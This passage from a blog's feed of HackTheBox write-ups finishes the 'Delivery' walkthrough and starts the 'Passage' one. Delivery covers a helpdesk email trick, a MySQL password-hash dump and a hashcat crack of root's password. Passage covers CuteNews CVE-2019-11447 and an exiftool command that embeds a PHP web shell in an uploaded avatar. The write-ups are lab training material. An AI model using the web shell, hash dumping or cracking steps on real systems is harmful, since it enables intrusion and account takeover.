<p><div class="img-container"><img src="imgs/image-20210522032634304.png" alt="image-20210522032634304"  /></div>
</p>
<p>Sign up is allowed, but the page clearly shows that valid email is required.</p>
<p><div class="img-container"><img src="imgs/image-20210522032749098.png" alt="image-20210522032749098"  /></div>
</p>
<p>And here is why a valid email is required, there is a verification process.</p>
<p><div class="img-container"><img src="imgs/image-20210522033006957.png" alt="image-20210522033006957"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-maildeliverer">Shell as maildeliverer</h3>
<h4 id="access-to-mattermost-using-tickettrick">Access to Mattermost using TicketTrick</h4>
<p>The idea of TicketTrick here is to use the temporary email address given by the support ticket system to register on Mattermost.</p>
<p>For me, the previous email is: <code>4709941@delivery.htb</code>. I’ll use that to register on Mattermost.</p>
<p><div class="img-container"><img src="imgs/image-20210522034638745.png" alt="image-20210522034638745"  /></div>
</p>
<p>The verification is sent to <code>4709941@delivery.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210522034704297.png" alt="image-20210522034704297"  /></div>
</p>
<p>Back on helpdesk, I can see the verification link to activate the my previously created Mattermost account.</p>
<p><div class="img-container"><img src="imgs/image-20210522034915465.png" alt="image-20210522034915465"  /></div>
</p>
<p>Visiting <code>http://delivery.htb:8065/do_verify_email?token=eoy11mus8h6m4hctpmwt9qw31cdsfcxzbg7noyc5gzpc6htp9e8mqe55wwewaju9&amp;email=4709941%40delivery.htb</code> redirects back to MatterMost which confirms the email has been verified.</p>
<p><div class="img-container"><img src="imgs/image-20210522035035109.png" alt="image-20210522035035109"  /></div>
</p>
<p>Upon logging in, I&rsquo;m able to join the Internal channel (like server on Discord). There is one channel called internal.</p>
<p><div class="img-container"><img src="imgs/image-20210522035330637.png" alt="image-20210522035330637"  /></div>
</p>
<p>The chats from root contain a set of credentials and a few hints which indicates that they use a variant password of “PleaseSubscribe!”.</p>
<h4 id="ssh---maildeliverer">SSH - maildeliverer</h4>
<p>The credentials of maildeliverer works on SSH.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «delivery» «10.10.14.70» 
</span></span><span class="line"><span class="cl">$ ssh maildeliverer@delivery.htb
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">maildeliverer@delivery.htb<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">Linux Delivery 4.19.0-13-amd64 <span class="c1">#1 SMP Debian 4.19.160-2 (2020-11-28) x86_64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">Last login: Fri May <span class="m">21</span> 14:11:23 <span class="m">2021</span> from 10.10.16.16
</span></span><span class="line"><span class="cl">maildeliverer@Delivery:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>maildeliverer<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>maildeliverer<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>maildeliverer<span class="o">)</span>
</span></span></code></pre></div><p>The user flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">maildeliverer@Delivery:~$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> maildeliverer maildeliverer <span class="m">33</span> May <span class="m">21</span> 11:21 user.txt
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>Enumerating on <code>/opt</code> finds the Mattermost installation folder. The Mattermost config file contains the database credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">maildeliverer@Delivery:/opt/mattermost/config$ cat config.json <span class="p">|</span> grep SqlSetting -A10
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;SqlSettings&#34;</span>: <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;DriverName&#34;</span>: <span class="s2">&#34;mysql&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;DataSource&#34;</span>: <span class="s2">&#34;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;DataSourceReplicas&#34;</span>: <span class="o">[]</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;DataSourceSearchReplicas&#34;</span>: <span class="o">[]</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;MaxIdleConns&#34;</span>: 20,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;ConnMaxLifetimeMilliseconds&#34;</span>: 3600000,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;MaxOpenConns&#34;</span>: 300,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Trace&#34;</span>: false,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;AtRestEncryptKey&#34;</span>: <span class="s2">&#34;n5uax3d4f919obtsp1pw1k5xetq1enez&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;QueryTimeout&#34;</span>: 30,
</span></span></code></pre></div><p>The credentials is <code>mmuser:Crack_The_MM_Admin_PW</code>.</p>
<h4 id="mysql---dump-passwords">MySQL - Dump Passwords</h4>
<p>With database credentials, I can connect to the MySQL service.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">maildeliverer@Delivery:/opt/mattermost/config$ mysql mattermost -u mmuser -pCrack_The_MM_Admin_PW
</span></span><span class="line"><span class="cl">Reading table information <span class="k">for</span> completion of table and column names
</span></span><span class="line"><span class="cl">You can turn off this feature to get a quicker startup with -A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
</span></span><span class="line"><span class="cl">Your MariaDB connection id is <span class="m">395</span>
</span></span><span class="line"><span class="cl">Server version: 10.3.27-MariaDB-0+deb10u1 Debian <span class="m">10</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">MariaDB <span class="o">[</span>mattermost<span class="o">]</span>&gt;
</span></span></code></pre></div><p>There is a users table which usually contains something juicy.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">MariaDB <span class="o">[</span>mattermost<span class="o">]</span>&gt; show tables<span class="p">;</span>
</span></span><span class="line"><span class="cl">+------------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> Tables_in_mattermost   <span class="p">|</span>
</span></span><span class="line"><span class="cl">+------------------------+
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl"><span class="p">|</span> Users                  <span class="p">|</span>
</span></span><span class="line"><span class="cl">+------------------------+
</span></span><span class="line"><span class="cl"><span class="m">46</span> rows in <span class="nb">set</span> <span class="o">(</span>0.001 sec<span class="o">)</span>
</span></span></code></pre></div><p>I can get the columns of the table user by querying <code>describe Users;</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">MariaDB <span class="o">[</span>mattermost<span class="o">]</span>&gt; describe Users<span class="p">;</span>
</span></span><span class="line"><span class="cl">+--------------------+--------------+------+-----+---------+-------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> Field              <span class="p">|</span> Type         <span class="p">|</span> Null <span class="p">|</span> Key <span class="p">|</span> Default <span class="p">|</span> Extra <span class="p">|</span>
</span></span><span class="line"><span class="cl">+--------------------+--------------+------+-----+---------+-------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> Id                 <span class="p">|</span> varchar<span class="o">(</span>26<span class="o">)</span>  <span class="p">|</span> NO   <span class="p">|</span> PRI <span class="p">|</span> NULL    <span class="p">|</span>       <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> CreateAt           <span class="p">|</span> bigint<span class="o">(</span>20<span class="o">)</span>   <span class="p">|</span> YES  <span class="p">|</span> MUL <span class="p">|</span> NULL    <span class="p">|</span>       <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> UpdateAt           <span class="p">|</span> bigint<span class="o">(</span>20<span class="o">)</span>   <span class="p">|</span> YES  <span class="p">|</span> MUL <span class="p">|</span> NULL    <span class="p">|</span>       <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> DeleteAt           <span class="p">|</span> bigint<span class="o">(</span>20<span class="o">)</span>   <span class="p">|</span> YES  <span class="p">|</span> MUL <span class="p">|</span> NULL    <span class="p">|</span>       <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Username           <span class="p">|</span> varchar<span class="o">(</span>64<span class="o">)</span>  <span class="p">|</span> YES  <span class="p">|</span> UNI <span class="p">|</span> NULL    <span class="p">|</span>       <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Password           <span class="p">|</span> varchar<span class="o">(</span>128<span class="o">)</span> <span class="p">|</span> YES  <span class="p">|</span>     <span class="p">|</span> NULL    <span class="p">|</span>       <span class="p">|</span>
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">+--------------------+--------------+------+-----+---------+-------+
</span></span><span class="line"><span class="cl"><span class="m">25</span> rows in <span class="nb">set</span> <span class="o">(</span>0.001 sec<span class="o">)</span>
</span></span></code></pre></div><p>I&rsquo;ll dump that the username and password columns from the table Users.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">MariaDB <span class="o">[</span>mattermost<span class="o">]</span>&gt; <span class="k">select</span> Username,Password from Users<span class="p">;</span>
</span></span><span class="line"><span class="cl">+----------------------------------+--------------------------------------------------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> Username                         <span class="p">|</span> Password                                                     <span class="p">|</span>
</span></span><span class="line"><span class="cl">+----------------------------------+--------------------------------------------------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> surveybot                        <span class="p">|</span>                                                              <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> c3ecacacc7b94f909d04dbfd308a9b93 <span class="p">|</span> <span class="nv">$2</span>a<span class="nv">$10$u5815SIBe2Fq1FZlv9S8I</span>.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> 5b785171bfb34762a933e127630c4860 <span class="p">|</span> <span class="nv">$2</span>a<span class="nv">$10$3</span>m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> testmail                         <span class="p">|</span> <span class="nv">$2</span>a<span class="nv">$10$gSBaz3a76sX</span>.ikqynx4E7O2NYn9.q6fcSopTwYP672lJMSbZ6.IQa <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="nb">help</span>                             <span class="p">|</span> <span class="nv">$2</span>a<span class="nv">$10$zsb4KbggZbpQi2Wa8W0</span>.C.lHVJxiUBr6cyNFbDbWu11j6JBJrVkpm <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> root                             <span class="p">|</span> <span class="nv">$2</span>a<span class="nv">$10$VM6EeymRxJ29r8Wjkr8Dtev0O</span>.1STWb4.4ScG.anuu7v0EFJwgjjO <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ff0a21fc6fc2488195e16ea854c963ee <span class="p">|</span> <span class="nv">$2</span>a<span class="nv">$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS</span>.Pduq <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> channelexport                    <span class="p">|</span>                                                              <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> 9ecfb4be145d47fda0724f697f35ffaf <span class="p">|</span> <span class="nv">$2</span>a<span class="nv">$10$s</span>.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> aaaa                             <span class="p">|</span> <span class="nv">$2</span>a<span class="nv">$10$yIdqqOXl</span>.5dcWsXk.Doo2ewl.zTFdsDd2F0.c44iWOpGMIgmDTsY6 <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> iiamf                            <span class="p">|</span> <span class="nv">$2</span>a<span class="nv">$10$esA8d</span>/l5.IKQJIhnl2SeYeeoFaCOE6Z/esUOSuRb.Vqtkf3gvbli6 <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> iamf                             <span class="p">|</span> <span class="nv">$2</span>a<span class="nv">$10$ZYEM</span>.GLMnAfq8eM.2rs8q.e/q3bHaOVOCvlu7YGhU0rU0Ug4PME9a <span class="p">|</span>
</span></span><span class="line"><span class="cl">+----------------------------------+--------------------------------------------------------------+
</span></span><span class="line"><span class="cl"><span class="m">12</span> rows in <span class="nb">set</span> <span class="o">(</span>0.000 sec<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">MariaDB <span class="o">[</span>mattermost<span class="o">]</span>&gt;
</span></span></code></pre></div><p>Those are bcrypt hashes, but let’s prioritize the root hash.</p>
<h4 id="cracking-the-hash">Cracking the Hash</h4>
<p>Based on the conversations on Mattermost, there is someone in the system that uses a variant of “PleaseSubscribe!” and they were talking about hashcat rules.</p>
<p>I remember exactly that Ippsec (the box author) has shown several techniques on how to generate a variant of seasonal passwords on <a href="https://www.youtube.com/watch?v=H9FcE_FMZio&amp;t=730s">Forest</a> .</p>
<p>Now the idea is instead of generating seasonal passwords, I can try to generate a few variant of &ldquo;PleaseSubscribe!&rdquo; and use them for cracking.</p>
<p>So, I&rsquo;ll start by calculating the length of “PleaseSubscribe!”.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «delivery» «10.10.14.70»
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> -n <span class="s1">&#39;PleaseSubsribe!&#39;</span> <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">15</span>
</span></span></code></pre></div><p>It has length of 15. I&rsquo;ll save the &ldquo;PleaseSubscribe!&rdquo; string to a file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «delivery» «10.10.14.70»
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;PleaseSubscribe!&#39;</span> &gt; IppsecSubscriber
</span></span></code></pre></div><p>Then I’ll feed that file to <code>hashcat</code> to generate some new variant of it using base64 rule, and I&rsquo;ll take out only the string which has a length greater than 15 and pipe the output to a file called <code>custom_wordlist</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «delivery» «10.10.14.70»
</span></span><span class="line"><span class="cl">$ hashcat IppsecSubscriber -r /usr/share/hashcat/rules/best64.rule --stdout <span class="p">|</span> awk <span class="s1">&#39;length($0) &gt; 15&#39;</span> &gt; custom_wordlist
</span></span></code></pre></div><p>It produces 46 words.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «delivery» «10.10.14.70»
</span></span><span class="line"><span class="cl">$ wc -w custom_wordlist
</span></span><span class="line"><span class="cl"><span class="m">46</span> custom_wordlist
</span></span></code></pre></div><p>With that wordlist the hash gets cracked instantly!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\t</span>ools<span class="se">\h</span>ashcat6&gt;hashcat.exe -m <span class="m">3200</span> <span class="s1">&#39;$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO&#39;</span> custom_wordlist --force
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">....
</span></span><span class="line"><span class="cl"><span class="nv">$2</span>a<span class="nv">$10$VM6EeymRxJ29r8Wjkr8Dtev0O</span>.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Session..........: hashcat
</span></span><span class="line"><span class="cl">Status...........: Cracked
</span></span><span class="line"><span class="cl">Hash.Name........: bcrypt <span class="nv">$2</span>*$, Blowfish <span class="o">(</span>Unix<span class="o">)</span>
</span></span><span class="line"><span class="cl">Hash.Target......: <span class="nv">$2</span>a<span class="nv">$10$VM6EeymRxJ29r8Wjkr8Dtev0O</span>.1STWb4.4ScG.anuu7v...JwgjjO
</span></span><span class="line"><span class="cl">Time.Started.....: Mon Mar <span class="m">15</span> 21:36:35 <span class="m">2021</span> <span class="o">(</span><span class="m">1</span> sec<span class="o">)</span>
</span></span><span class="line"><span class="cl">Time.Estimated...: Mon Mar <span class="m">15</span> 21:36:36 <span class="m">2021</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>....<span class="o">]</span>
</span></span></code></pre></div><p>The recovered password is <code>PleaseSubscribe!21</code>.</p>
<h4 id="su---root">SU - root</h4>
<p>That password works on root user.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">maildeliverer@Delivery:~$ su root
</span></span><span class="line"><span class="cl">Password: 
</span></span><span class="line"><span class="cl">root@Delivery:/home/maildeliverer# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span></code></pre></div><p>Now I can just grab the root flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@Delivery:/home/maildeliverer# <span class="nb">cd</span> ~
</span></span><span class="line"><span class="cl">root@Delivery:~# ls -l
</span></span><span class="line"><span class="cl">total <span class="m">16</span>
</span></span><span class="line"><span class="cl">-rwxr-x--- <span class="m">1</span> root root  <span class="m">103</span> Dec <span class="m">26</span> 11:26 mail.sh
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> root root  <span class="m">382</span> Dec <span class="m">28</span> 07:02 note.txt
</span></span><span class="line"><span class="cl">-rw-r----- <span class="m">1</span> root root <span class="m">1499</span> Dec <span class="m">26</span> 10:55 py-smtp.py
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> root root   <span class="m">33</span> May <span class="m">21</span> 11:21 root.txt
</span></span><span class="line"><span class="cl">root@Delivery:~# cat *.txt
</span></span><span class="line"><span class="cl">I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I<span class="s1">&#39;ve seen several times.  The inspiration for the box is here: 
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c 
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">Keep on hacking! And please don&#39;</span>t forget to subscribe to all the security streamers out there.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">- ippsec
</span></span><span class="line"><span class="cl">a7d68baadc3b3c072c6...&lt;SNIP&gt;...
</span></span></code></pre></div><p>There is also a message from the <a href="https://www.youtube.com/c/ippsec/videos">box’s author</a>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@Delivery:~# cat note.txt
</span></span><span class="line"><span class="cl">I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I<span class="s1">&#39;ve seen several times. The inspiration for the box is here:
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">Keep on hacking! And please don&#39;</span>t forget to subscribe to all the security streamers out there.
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Passage</title>
      <link>https://fahmifj.github.io/hackthebox/passage/</link>
      <pubDate>Fri, 07 May 2021 19:30:38 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/passage/</guid>
      <description>Leveraging USBCreator for local privilege escalation on Linux</description>
      <content:encoded><![CDATA[<p>Passage from HackTheBox hosts a news management software called CuteNews. The software is known to be vulnerable to a remote code execution, allowing me to gain code execution on the system via the avatar upload feature. Examining the source files of the software discovers a few password hashes that can be recovered using a dictionary attack. One of the recovered passwords can be used to escalate to a user. The user is using the same SSH key with another user. There is a unpatched package called USBCreator and it has vulnerability that allows an attacker to perform arbitrary file as root without supplying a password.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>
<p>CuteNews 2.1.2 exploitation</p>
</li>
<li>
<p>USBCreator D-bus exploitation</p>
</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>hashcat (Windows) - <a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></li>
<li>Exiftool - <a href="https://exiftool.org/">https://exiftool.org/</a></li>
<li>gdbus - Preinstalled in the target machine.</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial nmap discovers two open ports, SSH on port 22 and HTTP running Apache web server on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «passage» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oN initial-passage -v 10.10.10.206
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap 7.80 scan initiated Sat Sep  5 15:39:12 2020 as: nmap -sC -sV -oN initial-passage -v 10.10.10.206</span>
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.206
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.074s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed ports
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Passage News
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>As SSH usually requires credentials, I&rsquo;ll enumerate the web server on port 80.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>The page presenting a kind of news website called &ldquo;Passage News&rdquo;.</p>
<p><div class="img-container"><img src="imgs/d7ac9042cb934e58912a75669587968e.png" alt="d7ac9042cb934e58912a75669587968e"  /></div>
</p>
<p>The post titled &ldquo;Implemented Fail2Ban&rdquo; states that they have implemented the Fail2Ban feature. Knowing this, I will avoid any kind of brute force attack here.</p>
<p><div class="img-container"><img src="imgs/9eb82005d29d4c4e85aaa22c778203b0.png" alt="9eb82005d29d4c4e85aaa22c778203b0"  /></div>
</p>
<p>Inspecting the page sources finds a directory called &ldquo;CuteNews&rdquo;. I also find the hostname <code>passage.htb</code>.</p>
<p><div class="img-container"><img src="imgs/c78e8e637c114e089fc80228b7b92d20.png" alt="c78e8e637c114e089fc80228b7b92d20"  /></div>
</p>
<p>Adding <code>/CuteNews</code> to the URL redirects me to a login page.</p>
<p><div class="img-container"><img src="imgs/7fa49ed1b8fc47d6ad274565962e4007.png" alt="7fa49ed1b8fc47d6ad274565962e4007"  /></div>
</p>
<p>I can register as normal user.</p>
<p><div class="img-container"><img src="imgs/image-20210508014328401.png" alt="image-20210508014328401"  /></div>
</p>
<h4 id="searchsploit">Searchsploit</h4>
<p>I threw &ldquo;CuteNews 2.1.2&rdquo; to <code>searchsploit</code> and it returned several exploits.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «passage» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ searchsploit <span class="s1">&#39;CuteNews 2.1.2&#39;</span>
</span></span><span class="line"><span class="cl">------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl"> Exploit Title                                                     <span class="p">|</span>  Path
</span></span><span class="line"><span class="cl">------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl">CuteNews 2.1.2 - <span class="s1">&#39;avatar&#39;</span> Remote Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>       <span class="p">|</span> php/remote/46698.rb
</span></span><span class="line"><span class="cl">CuteNews 2.1.2 - Arbitrary File Deletion                           <span class="p">|</span> php/webapps/48447.txt
</span></span><span class="line"><span class="cl">CuteNews 2.1.2 - Authenticated Arbitrary File Upload               <span class="p">|</span> php/webapps/48458.txt
</span></span><span class="line"><span class="cl">------------------------------------------------------------------- ---------------------------------
</span></span></code></pre></div><p>I&rsquo;ll go with the &lsquo;avatar&rsquo; RCE.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="cutenews-cve-2019-11447">CuteNews CVE-2019-11447</h4>
<p>It turns out the &lsquo;avatar&rsquo; RCE exploit was a CVE. The exploit module description as follows:</p>
<blockquote>
<p>This module exploits a command execution vulnerability in CuteNews prior to 2.1.2.
The attacker can infiltrate the server through the avatar upload process in the profile area.
There is no realistic control of the $imgsize function in &ldquo;/core/modules/dashboard.php&rdquo;
Header content of the file can be changed and the control can be bypassed.
We can use the &ldquo;GIF&rdquo; header for this process.
An ordinary user is enough to exploit the vulnerability. No need for admin user.
The module creates a file for you and allows RCE.</p>
</blockquote>
<p>I can also exploit this manually.</p>
<p>I still have the payload that I made using <code>exiftool</code> in my previous <a href="/writeup/htb-magic">Magic write-up</a>. If I don&rsquo;t have it, I can create a new one, embedding a PHP web shell as a comment.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «passage» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ exiftool -Comment<span class="o">=</span><span class="s1">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> iamf.jpg
</span></span></code></pre></div><p>I&rsquo;ll rename my jpeg image to <code>iamfr.php</code>, and then I&rsquo;ll upload it as my avatar (Dashboard &ndash;&gt; Personal Options).</p>
<p><div class="img-container"><img src="imgs/image-20210508022032162.png" alt="image-20210508022032162"  /></div>
</p>
<p>The image is located at <code>http://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php</code></p>
<img src="imgs/image-20210508023129512.png" alt="image-20210508023129512" style="zoom:67%;" />
<p>I&rsquo;ll send a Python reverse shell through the web shell and capture it on my <code>nc</code> listener.</p>
